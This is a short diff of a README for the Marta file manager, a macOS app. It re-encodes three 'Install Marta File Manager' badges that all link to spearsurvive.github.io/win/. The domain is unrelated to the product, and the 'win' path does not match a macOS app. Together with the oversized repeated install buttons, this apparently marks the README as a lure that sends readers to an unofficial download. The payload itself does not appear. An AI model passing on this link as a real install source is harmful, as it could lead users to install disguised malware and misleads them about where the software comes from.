@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Marta is a native macOS dual-pane file manager designed for power users and keyb
 
 <div align="center">
 
-[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Marta is a native macOS dual-pane file manager designed for power users and keyb
 
 <div align="center">
 
-[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta%20File%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Marta File Manager](https://img.shields.io/badge/⬇_Install_Marta+File+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
